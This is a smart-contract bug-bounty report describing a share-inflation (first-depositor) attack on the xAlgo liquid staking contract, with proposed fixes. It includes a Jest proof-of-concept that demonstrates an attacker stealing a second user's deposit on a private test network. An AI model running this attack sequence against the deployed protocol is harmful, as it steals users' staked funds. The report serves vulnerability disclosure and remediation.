# #37893 \[SC-Insight] inflation attack in xalgo

## #37893 \[SC-Insight] Inflation Attack in xAlgo

**Submitted on Dec 18th 2024 at 11:43:02 UTC by @Blockian for** [**Audit Comp | Folks: Liquid Staking**](https://immunefi.com/audit-competition/folks-finance-liquid-staking-audit-competition)

* **Report ID:** #37893
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://github.com/Folks-Finance/algo-liquid-staking-contracts/blob/8bd890fde7981335e9b042a99db432e327681e1a/contracts/xalgo/consensus\\_v2.py>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

### Description

## Folks Finance Liquid Staking Bug Report

### Inflation Attack in xAlgo

#### Description

The liquid staking contract in Folks Finance is vulnerable to an inflation attack, allowing malicious actors to inflate xAlgo value by donating Algo to a proposer. This flaw enables attackers to exploit the system and steal deposits from other users.

#### Root Cause Analysis

The vulnerability stems from how xAlgo minting is calculated in the `immediate_mint` and `claim_delayed` functions.

**`immediate_mint` function:**

```python
mint_amount.store(
    If(
        algo_balance.load(),
        mul_scale(
            mul_scale(algo_sent, get_x_algo_circulating_supply(), algo_balance.load()),
            ONE_16_DP - App.globalGet(premium_key),
            ONE_16_DP
        ),
        algo_sent
    )
)
```

**`claim_delayed` function:**

```python
mint_amount.store(
    If(
        algo_balance.load(),
        mul_scale(delay_mint_stake, get_x_algo_circulating_supply(), algo_balance.load()),
        delay_mint_stake
    )
)
```

In both cases, when `algo_balance` equals zero, xAlgo can be minted at a 1:1 ratio with Algo. For example, if a user supplies `1` Algo, they can mint `1` xAlgo.

An attacker exploits this by donating Algo to a proposer after minting `1` xAlgo for themselves, which increases the rewards pool. Since this rewards Algo is factored into the `algo_balance` calculation:

```python
algo_balance.store(
    App.globalGet(total_active_stake_key)
    + App.globalGet(total_rewards_key)
    - App.globalGet(total_unclaimed_fees_key)
)
```

The inflated `algo_balance` results in disproportionate xAlgo minting. Consequently, attackers can steal funds from other users by using the burn mechanism.

#### Example

1. **User 0** deposits `1 Algo` and receives `1 xAlgo`.
2. **User 0** donates `50 Algo`, artificially inflating the value of xAlgo.
3. **User 1** deposits `100 Algo` and receives only `1 xAlgo` due to the inflated value, which is a rounded down amount.
4. **User 0** withdraws their entire balance, taking `75 Algo` (stealing `25 Algo` from User 1).

#### Why is in interesting to Folks Finance on Algorand?

In Ethereum, such attacks are more prominent due to frontrunning risks. However, in Algorand this is less of an issue, making the inflation possible but the attack a bit tougher to perform.

The more interesting vector lies in the `delayed_mint` mechanism:

* When using `delayed_mint`, xAlgo minting is postponed, allowing attackers to monitor exact deposits and exploit the minting process without the need of frontrunning.
* Since `claim_delayed_mint` can be called by anyone, attackers can time their actions with precision and even automate the exploit.

**Exploit Process (Using `delayed_mint`):**

1. **Victim** performs a delayed mint with `100 Algo`.

After 320 rounds, xAlgo is available to mint, allowing the attacker to intervene: 2. **Attacker** mints `1 Algo`, receiving `1 xAlgo`.\
3\. **Attacker** donates `50 Algo`, inflating xAlgo value.\
4\. **Attacker** calls `claim_delayed_mint` for the victim, forcing them to mint only `1 xAlgo`.\
5\. **Attacker** burns their `1 xAlgo`, stealing funds from the victim.

Steps 2-5 can be performed atomically in a single transaction, ensuring minimal risk for the attacker.

#### Severity and Impact

This vulnerability is critical, as it allows attackers to steal user funds with minimal risk, undermining the protocol's integrity and user trust.

#### Proposed Solutions

1. **Minimum xAlgo Mint Threshold**: Implement a minimum threshold for xAlgo minting to prevent small deposits from manipulating the system.
2. **Minimum Algo Deposit Requirement**: Introduce a minimum deposit amount to reduce the attack surface.
3. **Initial Contract Deposit**: Mint dead xAlgo to the contract and have it act as the first depositor to ensure proper proportionality and mitigate inflation risks.

By implementing these fixes, the protocol can effectively mitigate this vulnerability and safeguard user funds.

### Proof of Concept

## POC

Run this test file, the `IMMUNEFI POC` test is the main test to watch

```ts
import {
  ABIContract,
  Account,
  Algodv2,
  AtomicTransactionComposer,
  decodeAddress,
  decodeUint64,
  encodeUint64,
  generateAccount,
  getApplicationAddress,
  getMethodByName,
  IntDecoding,
  makeApplicationCreateTxn,
  makeApplicationUpdateTxn,
  makeBasicAccountTransactionSigner,
  modelsv2,
  OnApplicationComplete,
} from "algosdk";
import { mulScale, mulScaleRoundUp, ONE_16_DP, ONE_4_DP } from "folks-finance-js-sdk";
import { sha256 } from "js-sha256";
import { prepareOptIntoAssetTxn } from "./transactions/common";
import {
  parseXAlgoConsensusV1GlobalState,
  prepareAddProposerForXAlgoConsensus,
  prepareBurnFromXAlgoConsensusV2,
  prepareClaimDelayedMintFromXAlgoConsensus,
  prepareClaimXAlgoConsensusV2Fee,
  prepareDelayedMintFromXAlgoConsensusV2,
  prepareImmediateMintFromXAlgoConsensusV2,
  prepareInitialiseXAlgoConsensusV1,
  prepareInitialiseXAlgoConsensusV2,
  preparePauseXAlgoConsensusMinting,
  prepareRegisterXAlgoConsensusOffline,
  prepareRegisterXAlgoConsensusOnline,
  prepareScheduleXAlgoConsensusSCUpdate,
  prepareUpdateXAlgoConsensusAdmin,
  prepareUpdateXAlgoConsensusV2Fee,
  prepareUpdateXAlgoConsensusPremium,
  prepareUpdateXAlgoConsensusMaxProposerBalance,
  prepareUpdateXAlgoConsensusSC,
  prepareSetXAlgoConsensusProposerAdmin,
  prepareSubscribeXAlgoConsensusProposerToXGov,
  prepareUnsubscribeXAlgoConsensusProposerFromXGov,
  prepareXAlgoConsensusDummyCall,
  parseXAlgoConsensusV2GlobalState,
  prepareCreateXAlgoConsensusV1,
  prepareMintFromXAlgoConsensusV1,
} from "./transactions/xAlgoConsensus";
import { getABIContract } from "./utils/abi";
import { getAlgoBalance, getAssetBalance } from "./utils/account";
import {
  compilePyTeal,
  compileTeal,
  enc,
  getAppGlobalState,
  getParsedValueFromState,
  parseUint64s
} from "./utils/contracts";
import { fundAccountWithAlgo } from "./utils/fund";
import { privateAlgodClient, startPrivateNetwork, stopPrivateNetwork } from "./utils/privateNetwork";
import { advanceBlockRounds, advancePrevBlockTimestamp } from "./utils/time";
import { getParams, submitGroupTransaction, submitTransaction } from "./utils/transaction";

jest.setTimeout(1000000);

describe("Algo Consensus V2", () => {
  let algodClient: Algodv2;
  let prevBlockTimestamp: bigint;
  let user1: Account = generateAccount();
  let user2: Account = generateAccount();
  let proposer0: Account = generateAccount();
  let proposer1: Account = generateAccount();
  let proposer2: Account = generateAccount();
  let admin: Account = generateAccount();
  let registerAdmin: Account = generateAccount();
  let xGovAdmin: Account = generateAccount();
  let proposerAdmin: Account = generateAccount();
  let xAlgoAppId: number, xAlgoId: number;
  let xAlgoConsensusABI: ABIContract;

  let xGovRegistryAppId: number;
  let xGovRegistryABI: ABIContract;
  let xGovFee: bigint;

  const timeDelay = BigInt(86400);
  const minProposerBalance = BigInt(5e6);
  const maxProposerBalance = BigInt(500e6);
  const premium = BigInt(0.001e16); // 0.1%
  const fee = BigInt(0.1e4); // 10%

  const nonce = Uint8Array.from([0, 0]);
  const resizeProposerBoxCost = BigInt(16000);
  const updateSCBoxCost = BigInt(32100);
  const delayMintBoxCost = BigInt(36100);

  async function getXAlgoRate() {
    const atc = new AtomicTransactionComposer();
    atc.addMethodCall({
      sender: user1.addr,
      signer: makeBasicAccountTransactionSigner(user1),
      appID: xAlgoAppId,
      method: getMethodByName(xAlgoConsensusABI.methods, "get_xalgo_rate"),
      methodArgs: [],
      suggestedParams: await getParams(algodClient),
    });
    const simReq = new modelsv2.SimulateRequest({
      txnGroups: [],
      allowUnnamedResources: true,
    })
    const { methodResults }  = await atc.simulate(algodClient, simReq);
    const { returnValue } = methodResults[0];
    const [algoBalance, xAlgoCirculatingSupply, balances]: [bigint, bigint, Uint8Array] = returnValue as any;
    const proposersBalances = parseUint64s(Buffer.from(balances).toString("base64"));
    return { algoBalance, xAlgoCirculatingSupply, proposersBalances } ;
  }

  beforeAll(async () => {
    await startPrivateNetwork();
    algodClient = privateAlgodClient();
    algodClient.setIntEncoding(IntDecoding.MIXED);

    // initialise accounts with algo
    await fundAccountWithAlgo(algodClient, user1.addr, 1000e6, await getParams(algodClient));
    await fundAccountWithAlgo(algodClient, user2.addr, 1000e6, await getParams(algodClient));
    await fundAccountWithAlgo(algodClient, admin.addr, 1000e6, await getParams(algodClient));
    await fundAccountWithAlgo(algodClient, registerAdmin.addr, 1000e6, await getParams(algodClient));
    await fundAccountWithAlgo(algodClient, xGovAdmin.addr, 1000e6, await getParams(algodClient));
    await fundAccountWithAlgo(algodClient, proposerAdmin.addr, 1000e6, await getParams(algodClient));

    // advance time well past current time so we are dealing with deterministic time using offsets
    prevBlockTimestamp = await advancePrevBlockTimestamp(algodClient, 1000);

    // deploy xgov registry
    const approval = await compileTeal(compilePyTeal('contracts/testing/xgov_registry'));
    const clear = await compileTeal(compilePyTeal('contracts/common/clear_program', 10));
    const tx = makeApplicationCreateTxn(user1.addr, await getParams(algodClient), OnApplicationComplete.NoOpOC, approval, clear, 0, 0, 1, 0);
    const txId = await submitTransaction(algodClient, tx, user1.sk);
    const txInfo = await algodClient.pendingTransactionInformation(txId).do();
    xGovRegistryAppId = txInfo["application-index"];
    xGovRegistryABI = getABIContract('contracts/testing/xgov_registry');
    xGovFee = BigInt(getParsedValueFromState(await getAppGlobalState(algodClient, xGovRegistryAppId), "xgov_fee") || 0);
  });

  afterAll(() => {
    stopPrivateNetwork();
  });

  describe("creation" , () => {
    test("succeeds in updating from x algo consensus v1 to x algo consensus v2", async () => {
      // deploy algo consensus v1
      const { tx: createTx, abi } = await prepareCreateXAlgoConsensusV1(admin.addr, admin.addr, registerAdmin.addr, minProposerBalance, maxProposerBalance, premium, fee, await getParams(algodClient));
      xAlgoConsensusABI = abi;
      let txId = await submitTransaction(algodClient, createTx, admin.sk);
      let txInfo = await algodClient.pendingTransactionInformation(txId).do();
      xAlgoAppId = txInfo["application-index"];

      // fund minimum balance
      await fundAccountWithAlgo(algodClient, proposer0.addr, BigInt(0.1e6), await getParams(algodClient));
      await fundAccountWithAlgo(algodClient, getApplicationAddress(xAlgoAppId), 0.6034e6);

      // initialise algo consensus v1
      const initTxns = prepareInitialiseXAlgoConsensusV1(xAlgoConsensusABI, xAlgoAppId, admin.addr, proposer0.addr, await getParams(algodClient));
      [, txId] = await submitGroupTransaction(algodClient, initTxns, [proposer0.sk, admin.sk]);
      txInfo = await algodClient.pendingTransactionInformation(txId).do();
      xAlgoId = txInfo['inner-txns'][0]['asset-index'];

      // verify xAlgo was created
      const assetInfo = await algodClient.getAssetByID(xAlgoId).do();
      expect(assetInfo.params.creator).toEqual(getApplicationAddress(xAlgoAppId));
      expect(assetInfo.params.reserve).toEqual(getApplicationAddress(xAlgoAppId));
      expect(assetInfo.params.total).toEqual(BigInt(10e15));
      expect(assetInfo.params.decimals).toEqual(6);
      expect(assetInfo.params.name).toEqual('Governance xAlgo');
      expect(assetInfo.params['unit-name']).toEqual('xALGO');

      // opt into xALGO
      let optInTx = prepareOptIntoAssetTxn(admin.addr, xAlgoId, await getParams(algodClient));
      await submitTransaction(algodClient, optInTx, admin.sk);
      optInTx = prepareOptIntoAssetTxn(user1.addr, xAlgoId, await getParams(algodClient));
      await submitTransaction(algodClient, optInTx, user1.sk);
      optInTx = prepareOptIntoAssetTxn(user2.addr, xAlgoId, await getParams(algodClient));
      await submitTransaction(algodClient, optInTx, user2.sk);

      // mint to get pool started
      const mintAmount = BigInt(100e6);
      const mintTxns = prepareMintFromXAlgoConsensusV1(xAlgoConsensusABI, xAlgoAppId, xAlgoId, user2.addr, mintAmount, proposer0.addr, await getParams(algodClient));
      await submitGroupTransaction(algodClient, mintTxns, mintTxns.map(() => user2.sk));

      // verify global state
      const state = await parseXAlgoConsensusV1GlobalState(algodClient, xAlgoAppId);
      expect(state.initialised).toEqual(true);
      expect(state.admin).toEqual(admin.addr);
      expect(state.registerAdmin).toEqual(registerAdmin.addr);
      expect(state.xAlgoId).toEqual(xAlgoId);
      expect(state.numProposers).toEqual(BigInt(1));
      expect(state.minProposerBalance).toEqual(minProposerBalance);
      expect(state.maxProposerBalance).toEqual(maxProposerBalance);
      expect(state.fee).toEqual(fee);
      expect(state.premium).toEqual(premium);
      expect(state.totalPendingStake).toEqual(BigInt(0));
      expect(state.totalActiveStake).toEqual(mintAmount);
      expect(state.totalRewards).toEqual(BigInt(0));
      expect(state.totalUnclaimedFees).toEqual(BigInt(0));
      expect(state.canImmediateMint).toEqual(true);
      expect(state.canDelayMint).toEqual(false);

      // verify proposers box
      const proposersBox = await algodClient.getApplicationBoxByName(xAlgoAppId, enc.encode("pr")).do();
      const proposers = new Uint8Array(960);
      proposers.set(decodeAddress(proposer0.addr).publicKey, 0);
      expect(proposersBox.value).toEqual(proposers);

      // verify added proposer box
      const boxName = Uint8Array.from([...enc.encode("ap"), ...decodeAddress(proposer0.addr).publicKey]);
      const addedProposerBox = await algodClient.getApplicationBoxByName(xAlgoAppId, boxName).do();
      expect(addedProposerBox.value).toEqual(new Uint8Array(0));

      // verify balances
      const user2XAlgoBalance = await getAssetBalance(algodClient, user2.addr, xAlgoId);
      expect(user2XAlgoBalance).toEqual(mintAmount);

      // update to algo consensus v2
      const approval = await compileTeal(compilePyTeal('contracts/xalgo/consensus_v2'));
      const clear = await compileTeal(compilePyTeal('contracts/common/clear_program', 10));
      const updateTx = makeApplicationUpdateTxn(admin.addr, await getParams(algodClient), xAlgoAppId, approval, clear);
      await submitTransaction(algodClient, updateTx, admin.sk);
      xAlgoConsensusABI = getABIContract('contracts/xalgo/consensus_v2');
    });
  });

  describe("initialise", () => {
    test("succeeds for admin", async () => {
      const oldState = await parseXAlgoConsensusV1GlobalState(algodClient, xAlgoAppId);

      // initialise
      const tx = prepareInitialiseXAlgoConsensusV2(xAlgoConsensusABI, xAlgoAppId, admin.addr, await getParams(algodClient));
      await submitTransaction(algodClient, tx, admin.sk);

      // verify global state
      const unformattedState = await getAppGlobalState(algodClient, xAlgoAppId);
      expect(getParsedValueFromState(unformattedState, "initialised")).toBeUndefined();
      expect(getParsedValueFromState(unformattedState, "min_proposer_balance")).toBeUndefined();

      const state = await parseXAlgoConsensusV2GlobalState(algodClient, xAlgoAppId);
      expect(state.initialised).toEqual(true);
      expect(state.admin).toEqual(oldState.admin);
      expect(state.xGovAdmin).toEqual(oldState.admin);
      expect(state.registerAdmin).toEqual(oldState.registerAdmin);
      expect(state.xAlgoId).toEqual(oldState.xAlgoId);
      expect(state.numProposers).toEqual(oldState.numProposers);
      expect(state.maxProposerBalance).toEqual(oldState.maxProposerBalance);
      expect(state.fee).toEqual(oldState.fee);
      expect(state.premium).toEqual(oldState.premium);
      expect(state.totalPendingStake).toEqual(oldState.totalPendingStake);
      expect(state.totalActiveStake).toEqual(oldState.totalActiveStake);
      expect(state.totalRewards).toEqual(oldState.totalRewards);
      expect(state.totalUnclaimedFees).toEqual(oldState.totalUnclaimedFees);
      expect(state.canImmediateMint).toEqual(oldState.canImmediateMint);
      expect(state.canDelayMint).toEqual(oldState.canDelayMint);

      // const { algoBalance: a, xAlgoCirculatingSupply: b, proposersBalances: c } = await getXAlgoRate();

      // console.log(`algoBalance: ${a}, xAlgoCirculatingSupply: ${b}, proposersBalances: ${c}`)
    });
  });

  describe("IMMUNEFI POC: Inflation attack", () => {
    const proposerAddrs = [proposer0.addr];

    beforeAll(async () => {
      // create a clean slate for the project

      const { xAlgoCirculatingSupply: xAlgoToBurn } = await getXAlgoRate();

      // this is only to start a clean slate
      const txns1 = prepareBurnFromXAlgoConsensusV2(xAlgoConsensusABI, xAlgoAppId, xAlgoId, user2.addr, xAlgoToBurn, BigInt(0), proposerAddrs, await getParams(algodClient));
      const [, txId1] = await submitGroupTransaction(algodClient, txns1, txns1.map(() => user2.sk));
      await algodClient.pendingTransactionInformation(txId1).do();

      // initial amounts
      const { algoBalance: algoBalanceInitial, xAlgoCirculatingSupply: xAlgoCirculatingSupplyInitial } = await getXAlgoRate();

      expect(algoBalanceInitial).toEqual(BigInt(0)); // no algo in protocol
      expect(xAlgoCirculatingSupplyInitial).toEqual(BigInt(0)); // no xAlgo in protocol
    })

    test("inflation attack steal from 2 minter", async () => {
      const mintAmount = BigInt(10e6);
      const halfMintAmount = BigInt(5e6);
      const minReceived = BigInt(0);

      // immediate mint for user 1
      const txns = prepareImmediateMintFromXAlgoConsensusV2(xAlgoConsensusABI, xAlgoAppId, xAlgoId, user1.addr, BigInt(1), minReceived, proposerAddrs, await getParams(algodClient));
      const [, txId] = await submitGroupTransaction(algodClient, txns, txns.map(() => user1.sk));
      await algodClient.pendingTransactionInformation(txId).do();

      // fund the proposer, it will return to the algoBalance as rewards.
      await fundAccountWithAlgo(algodClient, proposer0.addr, halfMintAmount, await getParams(algodClient));

      const { algoBalance: algoSpentByAttacker, xAlgoCirculatingSupply: xAlgoCirculatingSupplyAfterFirstMint } = await getXAlgoRate();

      console.log(`algoBalanceAfterFirstMint: ${algoSpentByAttacker}, xAlgoCirculatingSupplyAfterFirstMint: ${xAlgoCirculatingSupplyAfterFirstMint}`)

      expect(xAlgoCirculatingSupplyAfterFirstMint).toEqual(BigInt(1));

      // immediate mint for user 2
      const txns2 = prepareImmediateMintFromXAlgoConsensusV2(xAlgoConsensusABI, xAlgoAppId, xAlgoId, user2.addr, mintAmount, minReceived, proposerAddrs, await getParams(algodClient));
      const [, txId2] = await submitGroupTransaction(algodClient, txns2, txns2.map(() => user2.sk));
      await algodClient.pendingTransactionInformation(txId2).do();

      const { algoBalance: algoBalanceAfterSecondMint, xAlgoCirculatingSupply: xAlgoCirculatingSupplyAfterSecondMint } = await getXAlgoRate();
      
      console.log(`algoBalanceAfterSecondMint: ${algoBalanceAfterSecondMint}, xAlgoCirculatingSupplyAfterSecondMint: ${xAlgoCirculatingSupplyAfterSecondMint}`)

      expect(xAlgoCirculatingSupplyAfterSecondMint).toEqual(BigInt(2)); // only 1 additional xAlgo was minted

      // user1 withdraws and steals funds from user 2
      const txns1 = prepareBurnFromXAlgoConsensusV2(xAlgoConsensusABI, xAlgoAppId, xAlgoId, user1.addr, BigInt(1), BigInt(0), proposerAddrs, await getParams(algodClient));
      const [, txId1] = await submitGroupTransaction(algodClient, txns1, txns1.map(() => user1.sk));
      await algodClient.pendingTransactionInformation(txId1).do();

      // initial amounts
      const { algoBalance: algoBalanceAfterAttack, xAlgoCirculatingSupply: xAlgoCirculatingSupplyAfterAttack } = await getXAlgoRate();
      console.log(`algoBalanceAfterAttack: ${algoBalanceAfterAttack}, xAlgoCirculatingSupplyAfterAttack: ${xAlgoCirculatingSupplyAfterAttack}`)

      const attackerAlgoGain = algoBalanceAfterSecondMint - algoBalanceAfterAttack;
      const stolenAlgoAmount = attackerAlgoGain - algoSpentByAttacker;

      expect(attackerAlgoGain).toBeGreaterThan(algoSpentByAttacker); // attacker stole from the user 2

      console.log(`attacker gained: ${attackerAlgoGain}, attacker spent: ${algoSpentByAttacker}, attacker stole: ${stolenAlgoAmount}`)
    });
  });
});
```
